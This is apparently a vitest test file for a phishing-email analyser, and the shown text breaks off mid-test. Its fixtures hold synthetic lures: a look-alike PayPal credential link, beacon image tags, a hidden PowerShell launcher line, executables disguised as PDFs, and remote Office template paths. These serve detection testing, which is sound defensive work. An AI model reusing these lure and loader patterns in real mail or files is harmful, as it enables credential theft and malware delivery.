import { describe, expect, it, vi } from 'vitest'
import { deflateRaw, zip } from '../../test/zip'
import { type Obj, buildPdf, inflating, objStm, onePage, zlib } from '../../test/pdf'
import { hashBytes } from './eml'
import {
  REBUILT_FACT,
  analysePhishing,
  caseIocs,
  formatPhishReport,
  linksSection,
  noteScanText,
  structureLines
} from './phish'
import { extractIocsFromText, formatIocLine } from './ioc'
import { GAP } from './pdf'

// Counts the indicator scans of one exact text, for the test that a script
// shared by many actions is read once, and lets the deadline test act on a
// scan. Every other call passes straight on.
const iocScan = vi.hoisted(() => ({ watch: '', count: 0, onScan: null as ((text: string) => void) | null }))
vi.mock('./ioc', async (importOriginal) => {
  const real = await importOriginal<typeof import('./ioc')>()
  return {
    ...real,
    extractIocsFromText: (...args: Parameters<typeof real.extractIocsFromText>) => {
      if (args[0] === iocScan.watch) iocScan.count++
      iocScan.onScan?.(args[0])
      return real.extractIocsFromText(...args)
    }
  }
})

// A switch for the one test that needs the PDF reader to break. Everything
// else in this file gets the real reader.
const pdfReader = vi.hoisted(() => ({ throws: false }))
vi.mock('./pdf', async (importOriginal) => {
  const real = await importOriginal<{ readPdf: (bytes: Uint8Array) => unknown }>()
  return {
    ...real,
    readPdf: (bytes: Uint8Array) => {
      if (pdfReader.throws) throw new Error('reader broke')
      return real.readPdf(bytes)
    }
  }
})

// A whole message, shaped like the real thing: nested multiparts, a
// quoted-printable text body with a soft line break, a base64 HTML body, a
// Safe Links-wrapped anchor whose visible text is a different domain, a
// tracking pixel, and a macro-capable attachment.
const html =
  '<html><body><img src="http://track.paypa1.test/open.gif" width="1">' +
  '<p>Your account is limited.</p>' +
  '<a href="https://eur01.safelinks.protection.outlook.com/?url=https%3A%2F%2Flogin.paypa1.test%2Fverify&amp;data=05">' +
  'https://www.paypal.test/signin</a></body></html>'

const MAIL = `Received: from mx.corp.test (mx.corp.test [10.4.1.9])
\tby inbox.corp.test with ESMTPS id 9f1
\tfor <analyst@corp.test>; Mon, 21 Sep 2026 09:20:10 +0000 (UTC)
Received: from vps-77.hostingcheap.example (vps-77.hostingcheap.example [203.0.113.77])
\tby mx.corp.test with ESMTP id 3c9; Mon, 21 Sep 2026 09:18:40 +0000
Authentication-Results: mx.corp.test; spf=softfail smtp.mailfrom=noreply@hostingcheap.example; dkim=none; dmarc=fail header.from=paypal.test
Return-Path: <noreply@hostingcheap.example>
From: "PayPal Service <service@paypal.test>" <security@paypa1.test>
Reply-To: recover@secure-verify.test
To: analyst@corp.test
Subject: =?utf-8?B?QWN0aW9uIHJlcXVpcmVkOiB5b3VyIGFjY291bnQgaXMgbGltaXRlZA==?=
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="MIXED1"

--MIXED1
Content-Type: multipart/alternative; boundary="ALT1"

--ALT1
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable

Your account is limited. Verify at https://login.paypa1.test/verify=
 now.
--ALT1
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: base64

${btoa(html)}
--ALT1--
--MIXED1
Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Invoice_2026.docm"
Content-Disposition: attachment; filename="Invoice_2026.docm"
Content-Transfer-Encoding: base64

${btoa('fake macro document bytes')}
--MIXED1--
`

describe('inline parts and attachments that share a filename', () => {
  const COLLIDING = [
    'From: a@evil.test',
    'Subject: Invoice',
    'Content-Type: multipart/mixed; boundary="B"',
    '',
    '--B',
    'Content-Type: image/png',
    'Content-Disposition: inline; filename="image001.png"',
    'Content-Transfer-Encoding: base64',
    '',
    'iVBORw0KGgo=',
    '--B',
    'Content-Type: application/octet-stream',
    'Content-Disposition: attachment; filename="image001.png"',
    'Content-Transfer-Encoding: base64',
    '',
    'TVqQAAMAAAAEAAAA',
    '--B--',
    ''
  ].join('\n')

  it('keeps them apart, because a shared name used to merge them', async () => {
    const report = await analysePhishing(COLLIDING, [], [])
    expect(report.inlineImages).toHaveLength(1)
    expect(report.attachments).toHaveLength(1)
    // The one that matters: the real attachment is still on the attachment
    // side, where its declared-vs-actual mismatch gets reported.
    expect(report.attachments[0]?.sniffed).toContain('Windows executable')
  })
})

describe('analysePhishing over a whole message', () => {
  it('reads every layer of it', async () => {
    const report = await analysePhishing(MAIL, ['corp.test'], ['paypal', 'microsoft'])

    // Headers
    expect(report.headers.identities.find((i) => i.label === 'Subject')?.value).toBe(
      'Action required: your account is limited'
    )
    expect(report.headers.auth.map((a) => `${a.mechanism}=${a.result}`)).toEqual([
      'spf=softfail',
      'dkim=none',
      'dmarc=fail'
    ])
    expect(report.headers.hops[0].from).toContain('203.0.113.77')
    expect(report.headers.hops[1].delaySec).toBe(90)
    expect(report.headers.observations.map((o) => o.text)).toContain(
      'The display name contains an address at paypal.test, which is not the sending domain.'
    )

    // Body: soft line break joined, HTML kept as source
    expect(report.text).toContain('https://login.paypa1.test/verify now.')
    expect(report.htmlSource).toContain('<img src="http://track.paypa1.test/open.gif"')

    // Links: Safe Links unwrapped, look-alike folded, visible text compared
    const wrapped = report.links.find((l) => l.wrappedBy === 'Microsoft Safe Links')
    expect(wrapped?.target).toBe('https://login.paypa1.test/verify')
    expect(wrapped?.flags).toContain('reads as "paypal" once look-alike characters are folded')
    expect(wrapped?.flags).toContain('shown as a link to www.paypal.test, points at login.paypa1.test')

    // Attachment: hashed here, type named, nothing called malicious
    expect(report.attachments).toHaveLength(1)
    const [attachment] = report.attachments
    expect(attachment.filename).toBe('Invoice_2026.docm')
    expect(attachment.size).toBe('fake macro document bytes'.length)
    expect(attachment.sha256).toMatch(/^[0-9a-f]{64}$/)
    expect(attachment.sha1).toMatch(/^[0-9a-f]{40}$/)
    expect(attachment.facts).toContain('file type that can carry macros')
  })

  it('reaches no verdict anywhere in the report it emits', async () => {
    const markdown = formatPhishReport(await analysePhishing(MAIL, ['corp.test'], ['paypal']))
    expect(markdown).not.toMatch(/malicious|phishing|suspicious|spoofed|dangerous|threat/i)
    // Hashes are labelled with where they came from, always.
    expect(markdown).toContain('(computed here)')
    // Links in the LINKS section are defanged, so a copied report cannot be
    // clicked through. The body is a separate matter: it is evidence and is
    // carried verbatim, inside a fence, where nothing autolinks.
    expect(markdown).toContain('hxxps://login[.]paypa1[.]test/verify')
    const linkLine = markdown.split('\n').find((l) => l.startsWith('- hxxps://login')) ?? ''
    expect(linkLine).not.toContain('https://login.paypa1.test/verify')
  })
})

describe('the whole-message report after hardening', () => {
  it('builds indicators from the parsed message, not the raw paste', async () => {
    const report = await analysePhishing(MAIL, ['corp.test'], ['paypal'])
    const joined = report.indicators.join('\n')
    // The phishing URL is split by a quoted-printable soft line break in the
    // raw text, so scanning `raw` missed it entirely.
    expect(joined).toContain('login[.]paypa1[.]test')
    // And nothing from the base64 of the HTML part leaks in as an "indicator".
    expect(report.indicators.some((i) => i.includes('PGh0bWw'))).toBe(false)
  })

  it('carries the sender domain’s own look-alike facts', async () => {
    const report = await analysePhishing(MAIL, [], ['paypal'])
    expect(report.senderFacts).toContain('reads as "paypal" once look-alike characters are folded')
  })

  it('quarantines hostile values so the case note cannot be used as a beacon', async () => {
    const hostile = MAIL.replace(
      'Subject: =?utf-8?B?QWN0aW9uIHJlcXVpcmVkOiB5b3VyIGFjY291bnQgaXMgbGltaXRlZA==?=',
      'Subject: ![[private]] <img src="http://beacon.test/x.gif">'
    )
    const markdown = formatPhishReport(await analysePhishing(hostile, [], []))
    // Every line carrying the hostile string must have it inside inline code.
    const carrying = markdown.split('\n').filter((line) => line.includes('beacon.test'))
    expect(carrying.length).toBeGreaterThan(0)
    expect(carrying.every((line) => /`[^`]*beacon\.test[^`]*`/.test(line))).toBe(true)
    expect(markdown).not.toMatch(/^- Subject: !\[\[/m)
  })

  it('still reaches no verdict', async () => {
    const markdown = formatPhishReport(await analysePhishing(MAIL, ['corp.test'], ['paypal']))
    expect(markdown).not.toMatch(/malicious|phishing|suspicious|spoofed|dangerous|threat/i)
  })
})

describe('a hash is either this machine’s answer or nothing', () => {
  const b64 = (s: string): string => btoa(s)

  it('pins the digest to a value, not a shape', async () => {
    const mail =
      'Content-Type: application/octet-stream\n' +
      'Content-Disposition: attachment; filename="a.bin"\n' +
      `Content-Transfer-Encoding: base64\n\n${b64('MZ payload')}\n`
    const [a] = (await analysePhishing(mail, [], [])).attachments
    // The literal digest, computed outside this codebase with `shasum -a 256`.
    // Pinned to a VALUE, not a shape: a test that only checks 64 hex characters
    // passes just as happily on the hash of an empty file.
    expect(a.sha256).toBe('48bf631186b8c57da7e7a47b870604e8d58fa140633ee0c899cf25a549ebd7a6')
    expect(a.size).toBe('MZ payload'.length)
  })

  it('records nothing at all for a part it could not decode', async () => {
    // The exact shape that used to print the empty file's SHA-256 under
    // "computed here, from the bytes in the file".
    const mail =
      'Content-Type: application/octet-stream\n' +
      'Content-Disposition: attachment; filename="a.bin"\n' +
      'Content-Transfer-Encoding: base64\n\n=====\n'
    const report = await analysePhishing(mail, [], [])
    const [a] = report.attachments
    expect(a.sha256).toBe('')
    expect(a.sha1).toBe('')
    expect(a.facts).toContain('this part could not be decoded, so its size, hashes and type are not recorded')
    const md = formatPhishReport(report)
    expect(md).toContain('SHA-256 not recorded')
    expect(md).toContain('size not recorded')
    expect(md).not.toContain('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
  })
})

describe('the report carries the message body it says it carries', () => {
  it('emits the body, fenced, so a case records the mail and not just the analysis', async () => {
    const markdown = formatPhishReport(await analysePhishing(MAIL, [], []))
    expect(markdown).toContain('### Message body')
    expect(markdown).toContain('Your account is limited.')
    expect(markdown).toContain('<img src="http://track.paypa1.test/open.gif"')
  })

  it('fences content that contains a fence, so it cannot close its own block', async () => {
    const mail = 'Content-Type: text/plain\n\n```\n![[private]] <img src="http://beacon.test/x">\n`````\n'
    const markdown = formatPhishReport(await analysePhishing(mail, [], []))
    expect(markdown).toContain('``````')
    // The embed is inside the fence, not loose in the note.
    const lines = markdown.split('\n')
    const fenceStarts = lines.reduce((n, l) => n + (/^`{3,}$/.test(l) ? 1 : 0), 0)
    expect(fenceStarts % 2).toBe(0)
  })

  it('says so when there is no body rather than implying one', async () => {
    const markdown = formatPhishReport(await analysePhishing('From: a@b.test\nSubject: hi', [], []))
    expect(markdown).toContain('### Message body\n\nNot recorded.')
  })
})

describe('the extracted text travels with the analysis', () => {
  it('is on the report, so the screen, the clipboard and the case agree', async () => {
    const report = await analysePhishing(MAIL, [], [])
    expect(report.htmlText).toContain('Your account is limited.')
    // The markup itself is not in the extracted text.
    expect(report.htmlText).not.toContain('<img')
    expect(report.htmlText).not.toContain('track.paypa1.test/o.gif')

    const md = formatPhishReport(report)
    expect(md).toContain('Text extracted from the HTML, not rendered:')
    expect(md).toContain('Your account is limited.')
    // The source is still carried beside it, not replaced by it.
    expect(md).toContain('HTML source, not rendered:')
  })

  it('is empty, not invented, when the mail has no HTML part', async () => {
    const report = await analysePhishing('Content-Type: text/plain\n\nJust words.', [], [])
    expect(report.htmlText).toBe('')
    expect(formatPhishReport(report)).not.toContain('Text extracted from the HTML')
  })
})

describe('a PDF attachment is read for its structure', () => {
  const JPEG = [0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0xff, 0xd9]
  const head = '%PDF-1.7\n1 0 obj\n<< /Type /XObject /Subtype /Image /Filter /DCTDecode /Length 13 >>\nstream\n'
  const tail =
    '\nendstream\nendobj\n2 0 obj\n<< /A << /S /URI /URI (https://qr-lure.test/login) >> >>\nendobj\n' +
    'trailer\n<< /Root 1 0 R >>\n%%EOF\n'
  const bytes = [...head]
    .map((c) => c.charCodeAt(0))
    .concat(
      JPEG,
      [...tail].map((c) => c.charCodeAt(0))
    )
  const b64 = btoa(String.fromCharCode(...bytes))
  const mail =
    'From: a@sender.test\nTo: b@corp.test\nSubject: scan\nMIME-Version: 1.0\n' +
    'Content-Type: multipart/mixed; boundary="B"\n\n--B\nContent-Type: text/plain\n\nsee attached\n' +
    '--B\nContent-Type: application/pdf\nContent-Disposition: attachment; filename="scan.pdf"\n' +
    `Content-Transfer-Encoding: base64\n\n${b64}\n--B--\n`

  it('carries the picture, the link and its indicator into the report', async () => {
    const report = await analysePhishing(mail, [], [])
    const [pdf] = report.attachments
    expect(pdf.pdf?.images.map((i) => i.sniffed)).toEqual(['JPEG image'])
    expect(pdf.pdf?.uris).toEqual(['https://qr-lure.test/login'])
    // Found by the reader, and shown where it was found. The plain-bytes pass
    // sees the same URL here, and printing it again under "found inside the
    // file" only doubled the line on the card and in the report.
    expect(pdf.inside.some((l) => l.includes('qr-lure'))).toBe(false)
    // The lure is the indicator the analyst will block, so it reaches the
    // copied list and the case — not only the attachment's card.
    expect(report.indicators).toContain('url: hxxps://qr-lure[.]test/login')
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'url',
      value: 'https://qr-lure.test/login',
      note: 'inside scan.pdf'
    })
    const text = formatPhishReport(report)
    expect(text).toContain('PDF link (/URI): `hxxps://qr-lure[.]test/login`')
    expect(text).toMatch(
      /embedded picture `byte \d+ \(\/DCTDecode\)`: JPEG image, 13 bytes, SHA-256 [0-9a-f]{64} \(computed here\)/
    )
  })

  it('calls a /DCTDecode stream whose bytes are not a picture a stream', async () => {
    // The filter name is the sender's word. A program under it was printed as
    // an "embedded picture".
    const program = [0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00]
    const stream = [...head.replace('/Length 13', '/Length 16')].map((c) => c.charCodeAt(0))
    const b = btoa(String.fromCharCode(...stream, ...program, ...[...tail].map((c) => c.charCodeAt(0))))
    const md = formatPhishReport(await analysePhishing(mail.replace(b64, b), [], []))
    expect(md).toMatch(/embedded stream `byte \d+ \(\/DCTDecode\)`: Windows executable \(MZ\), 16 bytes, SHA-256/)
    expect(md).not.toContain('embedded picture')
  })
})

// ─── Attachments built byte by byte ─────────────────────────────────────────

const ascii = (text: string): Uint8Array => Uint8Array.from(text, (c) => c.charCodeAt(0))

function base64(bytes: Uint8Array): string {
  let binary = ''
  for (let i = 0; i < bytes.length; i += 0x8000) binary += String.fromCharCode(...bytes.subarray(i, i + 0x8000))
  return btoa(binary)
}

interface MailPart {
  headers: string[]
  /** The base64 body as written, for a part that must not decode. */
  body?: string
  bytes?: Uint8Array
}

const attached = (name: string, bytes: Uint8Array, type = 'application/octet-stream'): MailPart => ({
  headers: [`Content-Type: ${type}; name="${name}"`, `Content-Disposition: attachment; filename="${name}"`],
  bytes
})

/** A multipart mail with a short text body, then each part base64-encoded. */
function mailWith(...parts: MailPart[]): string {
  const lines = [
    'From: a@sender.test',
    'To: b@corp.test',
    'Subject: files',
    'MIME-Version: 1.0',
    'Content-Type: multipart/mixed; boundary="B"',
    '',
    '--B',
    'Content-Type: text/plain',
    '',
    'see attached'
  ]
  for (const part of parts) {
    lines.push(
      '--B',
      ...part.headers,
      'Content-Transfer-Encoding: base64',
      '',
      part.body ?? base64(part.bytes ?? new Uint8Array())
    )
  }
  lines.push('--B--', '')
  return lines.join('\n')
}

/** A PDF whose objects are the strings given, in order. */
const pdf = (...objects: string[]): string =>
  `%PDF-1.7\n${objects.map((o, i) => `${i + 1} 0 obj\n${o}\nendobj\n`).join('')}trailer\n<< /Root 1 0 R >>\n%%EOF\n`

const hex = (text: string): string => [...text].map((c) => c.charCodeAt(0).toString(16).padStart(2, '0')).join('')

const PNG = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0x0d, 0x49, 0x48, 0x44, 0x52])

const rels = (...targets: [type: string, target: string][]): Uint8Array =>
  ascii(
    '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
      targets
        .map(
          ([type, target], i) =>
            `<Relationship Id="rId${i + 1}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="${target}" TargetMode="External"/>`
        )
        .join('') +
      '</Relationships>'
  )

describe('a part marked inline is filed by what its bytes are', () => {
  const lure = ascii(pdf('<< /Type /Catalog >>', '<< /A << /S /URI /URI (https://lure.example.test/login) >> >>'))

  it('files a PDF with a Content-ID as the attachment it is, lure and all', async () => {
    // Gmail puts a Content-ID on ordinary attachments. The flag alone filed this
    // under inline images, and its lure reached neither Indicators nor the report.
    const mail = mailWith({
      headers: [
        'Content-Type: application/pdf; name="Scan.pdf"',
        'Content-Disposition: attachment; filename="Scan.pdf"',
        'Content-ID: <part1@sender.test>'
      ],
      bytes: lure
    })
    const report = await analysePhishing(mail, [], [])
    expect(report.attachments).toHaveLength(1)
    expect(report.inlineImages).toHaveLength(0)
    expect(report.indicators).toContain('url: hxxps://lure[.]example[.]test/login')
    expect(formatPhishReport(report)).toContain('PDF link (/URI): `hxxps://lure[.]example[.]test/login`')
    expect(report.attachments[0].facts).toContain('marked inline or given a Content-ID by its own headers')
  })

  it('files a PDF sent as inline with a filename, as Apple Mail sends one, the same way', async () => {
    const hidden = ascii(
      pdf('<< /Type /Catalog >>', `<< /A << /S /URI /URI <${hex('https://inline-lure.test/login')}> >> >>`)
    )
    const mail = mailWith({
      headers: ['Content-Type: application/pdf', 'Content-Disposition: inline; filename="scan.pdf"'],
      bytes: hidden
    })
    const report = await analysePhishing(mail, [], [])
    expect(report.attachments.map((a) => a.filename)).toEqual(['scan.pdf'])
    expect(report.indicators).toContain('url: hxxps://inline-lure[.]test/login')
    expect(formatPhishReport(report)).toContain('hxxps://inline-lure[.]test/login')
  })

  it('files a part it could not decode as an attachment, never as "0 bytes"', async () => {
    const mail = mailWith({
      headers: ['Content-Type: image/png', 'Content-Disposition: inline; filename="logo.png"', 'Content-ID: <logo>'],
      body: '!!!!'
    })
    const report = await analysePhishing(mail, [], [])
    expect(report.attachments.map((a) => a.filename)).toEqual(['logo.png'])
    expect(report.inlineImages).toHaveLength(0)
    const md = formatPhishReport(report)
    expect(md).toContain('size not recorded')
    expect(md).not.toContain('0 bytes')
  })

  it('still files a real inline picture as one, and still carries its hash', async () => {
    const mail = mailWith({
      headers: ['Content-Type: image/png', 'Content-Disposition: inline; filename="logo.png"', 'Content-ID: <logo>'],
      bytes: PNG
    })
    const report = await analysePhishing(mail, [], [])
    expect(report.inlineImages.map((a) => a.filename)).toEqual(['logo.png'])
    // Which side of the split a part lands on is display only: its hash is evidence either way.
    expect(report.indicators).toContain(`hash: ${await hashBytes(PNG)}`)
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'hash',
      value: await hashBytes(PNG),
      note: 'logo.png (hashed here)'
    })
  })

  it('reports what the card shows about an inline picture, less what the heading already says', async () => {
    // The card showed the mismatch and the beacon; the copied report showed a name and a hash.
    const mail = mailWith({
      headers: [
        'Content-Type: application/pdf; name="Invoice.pdf"',
        'Content-Disposition: inline; filename="Invoice.pdf"',
        'Content-ID: <inv@sender.test>'
      ],
      bytes: new Uint8Array([...PNG, ...ascii(' https://beacon.evil.test/p?id=42 ')])
    })
    const report = await analysePhishing(mail, [], [])
    expect(report.inlineImages).toHaveLength(1)
    const md = formatPhishReport(report)
    expect(md).toContain('### Inline images — marked inline or given a Content-ID by their own headers')
    expect(md).toContain('  - bytes begin as PNG image')
    expect(md).toContain('  - `named .pdf but the bytes begin as PNG image`')
    expect(md).toContain('  - found inside the file: `url: hxxps://beacon[.]evil[.]test/p?id=42`')
    expect(md).not.toContain('`marked inline or given a Content-ID by its own headers`')
  })
})

describe('the case carries what the analysis found', () => {
  it('builds the same typed set createCase did, from the headers, the text, the links and the hashes', async () => {
    const report = await analysePhishing(MAIL, ['corp.test'], ['paypal'])
    const iocs = caseIocs(report, MAIL)
    expect(iocs).toContainEqual({ type: 'ip', value: '203.0.113.77' })
    // In the plain text, and the target of the Safe Links anchor: one row,
    // and the note from where it was also found.
    expect(iocs).toContainEqual({
      type: 'url',
      value: 'https://login.paypa1.test/verify',
      note: 'unwrapped from Microsoft Safe Links'
    })
    expect(iocs).toContainEqual({
      type: 'hash',
      value: report.attachments[0].sha256,
      note: 'Invoice_2026.docm (hashed here)'
    })
    // Each value once: a host, an address or a hash whatever case it was
    // written in, a URL as written.
    const keys = iocs.map((i) => `${i.type}:${i.type === 'url' ? i.value : i.value.toLowerCase()}`)
    expect(new Set(keys).size).toBe(keys.length)
  })
})

describe('a PDF whose header does not start the file', () => {
  const body = pdf(
    '<< /Type /Catalog /OpenAction 2 0 R >>',
    `<< /S /URI /URI <${hex('https://hidden-lure.test/login')}> >>`
  )

  for (const [label, prefix] of [
    ['one space', [0x20]],
    ['a byte-order mark', [0xef, 0xbb, 0xbf]]
  ] as const) {
    it(`still reaches the PDF reader after ${label}`, async () => {
      // Acrobat opens it. The sniff wanted %PDF at byte 0, so the reader never
      // ran and the hex /URI, which no text scan can see, was lost silently.
      const bytes = new Uint8Array([...prefix, ...ascii(body)])
      const report = await analysePhishing(mailWith(attached('Scan.pdf', bytes, 'application/pdf')), [], [])
      const [a] = report.attachments
      expect(a.pdf?.markers.map((m) => m.name)).toContain('/OpenAction')
      expect(a.pdf?.notes).toContain(`The %PDF header is at offset ${prefix.length}, not at the start of the file.`)
      expect(report.indicators).toContain('url: hxxps://hidden-lure[.]test/login')
      // True of the bytes, and the reason the reader had to be asked at all.
      expect(a.facts).toContain('named .pdf but its first bytes match no file signature this recognises')
    })
  }

  for (const [label, prefix, sniffed] of [
    ['an MZ stub', [0x4d, 0x5a, ...new Uint8Array(62)], 'Windows executable (MZ)'],
    ['a JPEG header', [0xff, 0xd8, 0xff, 0xfe, 0x00, 0x10, ...new Uint8Array(14).fill(0x41)], 'JPEG image'],
    ['a GIF header', [...ascii('GIF89a'), ...new Uint8Array(7)], 'GIF image']
  ] as const) {
    it(`reads a polyglot behind ${label} as the PDF it also is`, async () => {
      // The late header was looked for only when the first bytes matched no
      // signature, so a PDF behind a recognised stub was never read as one.
      const bytes = new Uint8Array([...prefix, ...ascii(body)])
      const report = await analysePhishing(mailWith(attached('Scan.pdf', bytes, 'application/pdf')), [], [])
      const [a] = report.attachments
      expect(a.pdf?.markers.map((m) => m.name)).toContain('/OpenAction')
      expect(a.pdf?.notes).toContain(`The %PDF header is at offset ${prefix.length}, not at the start of the file.`)
      expect(report.indicators).toContain('url: hxxps://hidden-lure[.]test/login')
      expect(a.facts).toContain(`named .pdf but the bytes begin as ${sniffed}`)
    })
  }

  it('names the PDF reader when it breaks on a polyglot, not the stub in front', async () => {
    pdfReader.throws = true
    try {
      const bytes = new Uint8Array([0xff, 0xd8, 0xff, 0xfe, 0x00, 0x10, ...ascii(body)])
      const report = await analysePhishing(mailWith(attached('Scan.pdf', bytes, 'application/pdf')), [], [])
      expect(report.attachments[0].facts).toContain(
        'the PDF structure reader stopped on this file, so its contents are not listed'
      )
    } finally {
      pdfReader.throws = false
    }
  })

  it('leaves a ZIP whose first entry is a PDF to the ZIP reader', async () => {
    const bytes = zip([{ name: 'Scan.pdf', data: ascii(body) }])
    const [a] = (await analysePhishing(mailWith(attached('Scan.zip', bytes)), [], [])).attachments
    expect(a.office?.entries.map((e) => e.name)).toEqual(['Scan.pdf'])
    expect(a.pdf).toBeUndefined()
  })

  it('does not read a text file as a PDF because it mentions endobj and %%EOF', async () => {
    const text = ascii('notes on the format: every object ends with endobj and the file with %%EOF\n')
    const report = await analysePhishing(mailWith(attached('notes.txt', text, 'text/plain')), [], [])
    expect(report.attachments[0].pdf).toBeUndefined()
  })
})

describe('what an archive holds', () => {
  it('lists a zip’s entries without saying its contents are not visible', async () => {
    const js = ascii('WScript.Shell.Run("powershell -w hidden")')
    const bytes = zip([{ name: 'Invoice_0931.js', data: js }])
    const report = await analysePhishing(mailWith(attached('Invoice.zip', bytes, 'application/zip')), [], [])
    const [a] = report.attachments
    expect(a.facts).not.toContain('archive — its contents are not visible from here')
    expect(a.office?.entries.map((e) => e.name)).toEqual(['Invoice_0931.js'])
    expect(structureLines(a)).toContain('  - entry `Invoice_0931.js`: named like an executable or script')
  })

  it('keeps the name-only fact for an archive it cannot read', async () => {
    const bytes = new Uint8Array([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c, 0, 4])
    const report = await analysePhishing(mailWith(attached('files.7z', bytes)), [], [])
    expect(report.attachments[0].facts).toContain('archive — its contents are not visible from here')
  })

  it('types and hashes the files inside, so a PE named Invoice.pdf is caught by its bytes', async () => {
    const pe = new Uint8Array(600)
    pe.set([0x4d, 0x5a, 0x90, 0x00])
    const bytes = zip([
      { name: 'Invoice.pdf', data: pe },
      { name: 'view.html', data: ascii('<html><body>hi</body></html>') },
      { name: 'run.js', data: ascii('var a = 1') }
    ])
    const mail = mailWith(attached('files.zip', bytes, 'application/zip'))
    const report = await analysePhishing(mail, [], [])
    const [a] = report.attachments
    const digest = await hashBytes(pe)
    const lines = structureLines(a)
    expect(lines).toContain(
      `  - inner file \`Invoice.pdf\`: named .pdf but the bytes begin as Windows executable (MZ); SHA-256 ${digest} (computed here)`
    )
    expect(lines).toContain('  - entry `view.html`: named as a web page, SVG or OneNote file')
    expect(report.indicators).toContain(`hash: ${digest}`)
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'hash',
      value: digest,
      note: 'Invoice.pdf inside files.zip (hashed here)'
    })
    // The report keeps what each file is, not the file.
    expect(Object.keys(a.office?.files[0] ?? {}).sort()).toEqual(['mismatch', 'name', 'sha256', 'sniffed'])
  })

  it('names what a file it could not read whole begins as, and gives no hash for it', async () => {
    const big = new Uint8Array(8_000_001)
    big.set([0x4d, 0x5a])
    const bytes = zip([{ name: 'payload.bin', data: await deflateRaw(big), method: 8, size: big.length }])
    const report = await analysePhishing(mailWith(attached('files.zip', bytes)), [], [])
    expect(structureLines(report.attachments[0])).toContain(
      '  - inner file `payload.bin`: bytes begin as Windows executable (MZ); not read whole, so not hashed here'
    )
  })

  it('caps the flagged entries in the report, and still says which ones are encrypted', async () => {
    const many = zip(Array.from({ length: 200 }, (_, i) => ({ name: `Invoice_${i}.exe`, data: ascii('xx'), flags: 1 })))
    const report = await analysePhishing(mailWith(attached('Invoices.zip', many)), [], [])
    const lines = structureLines(report.attachments[0])
    expect(lines.filter((l) => l.startsWith('  - entry ')).length).toBe(50)
    expect(lines).toContain('  - 150 further flagged entries are not listed')

    const mixed = zip([
      { name: 'payload.exe', data: ascii('xx'), flags: 1 },
      { name: 'readme.txt', data: ascii('read me') }
    ])
    const one = await analysePhishing(mailWith(attached('pw-1234.zip', mixed)), [], [])
    expect(structureLines(one.attachments[0])).toContain(
      '  - entry `payload.exe`: named like an executable or script; encrypted, so its contents cannot be read here'
    )
  })

  it('counts the entries it read, never the ones a directory it did not reach might list', async () => {
    // An end record declaring five entries, with two present.
    const short = zip([
      { name: 'a.txt', data: ascii('a') },
      { name: 'b.txt', data: ascii('b') }
    ])
    const eocd = new DataView(short.buffer, short.length - 22)
    eocd.setUint16(8, 5, true)
    eocd.setUint16(10, 5, true)
    const report = await analysePhishing(mailWith(attached('short.zip', short)), [], [])
    const lines = structureLines(report.attachments[0])
    expect(lines).toContain('  - 2 entries read from the ZIP directory')
    expect(lines.join('\n')).not.toMatch(/directory lists/)

    // No end record at all: no count, and the reader's note says why.
    const headless = new Uint8Array([0x50, 0x4b, 0x03, 0x04, ...new Uint8Array(200)])
    const none = await analysePhishing(mailWith(attached('broken.zip', headless)), [], [])
    const noneLines = structureLines(none.attachments[0])
    expect(noneLines.join('\n')).not.toMatch(/entr(y|ies) read from|directory lists/)
    expect(noneLines.join('\n')).toContain('no end-of-central-directory record was found')
  })

  it('escapes the names a sender wrote, so they cannot reorder the report or add rows to it', async () => {
    const bytes = zip([
      { name: 'a\u202Egpj.exe', data: ascii('xx') },
      { name: 'b.xml\n1,024 bytes\tDeflate\tword/fake.bin', data: ascii('<x/>') }
    ])
    const report = await analysePhishing(mailWith(attached('report\u202Eqiz.zip', bytes)), [], [])
    const lines = structureLines(report.attachments[0])
    // Flagged on the raw name, shown escaped.
    expect(lines).toContain('  - entry `a<U+202E>gpj.exe`: named like an executable or script')
    expect(lines.some((l) => l.includes('b.xml<U+000A>1,024 bytes<U+0009>Deflate'))).toBe(true)
    expect(lines.some((l) => /[\u202E\n\t]/.test(l))).toBe(false)
    expect(formatPhishReport(report)).toContain('- `report<U+202E>qiz.zip` — ')
  })

  it('puts a remote template written as a UNC path into the indicators, and a local path nowhere', async () => {
    const bytes = zip([
      { name: '[Content_Types].xml', data: ascii('<Types/>') },
      {
        name: 'word/_rels/settings.xml.rels',
        data: rels(
          ['attachedTemplate', '\\\\files.corp-share.app@SSL\\DavWWWRoot\\t.dotm'],
          ['attachedTemplate', '\\\\.\\pipe\\x'],
          ['attachedTemplate', '\\\\fileserver\\share'],
          ['attachedTemplate', 'file:///C:/x.dotm']
        )
      }
    ])
    const mail = mailWith(attached('Template.docx', bytes))
    const report = await analysePhishing(mail, [], [])
    expect(report.attachments[0].office?.externalTargets).toHaveLength(4)
    const found = report.indicators.filter((l) => !/^(email|hash): /.test(l))
    expect(found).toEqual(['domain: files[.]corp-share[.]app'])
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'domain',
      value: 'files.corp-share.app',
      note: 'inside Template.docx'
    })
  })

  it('reads the host out of a file URL wrapping a share path, in a template or a PDF link', async () => {
    // `file:///\\host\…` is how Word records a template on a share, and a PDF
    // link to a share is the same lure. Neither host reached the indicators.
    const docx = zip([
      { name: '[Content_Types].xml', data: ascii('<Types/>') },
      {
        name: 'word/_rels/settings.xml.rels',
        data: rels(
          ['attachedTemplate', 'file:///\\\\one.corp-share.app\\share\\t.dotm'],
          ['attachedTemplate', 'file:////two.corp-share.app/share/t.dotm'],
